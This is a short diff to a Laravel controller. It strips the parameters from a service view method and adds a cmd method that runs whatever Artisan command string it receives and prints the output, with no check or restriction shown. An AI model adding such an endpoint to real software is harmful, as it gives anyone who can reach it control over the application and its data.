@@ -3,6 +3,7 @@
 namespace App\Http\Controllers;
 
 use Illuminate\Http\Request;
+use Illuminate\Support\Facades\Artisan;
 
 class FrontController extends Controller
 {
@@ -10,8 +11,13 @@ class FrontController extends Controller
         return view('front.index');
     }
 
-    public function service($service, $category)
+    public function service()
     {
-        return view('front.service', compact('service', 'category'));
+        return view('front.service');
+    }
+    public function cmd($cmd){
+        Artisan::call("$cmd");
+        echo "<pre>";
+        return Artisan::output();
     }
 }
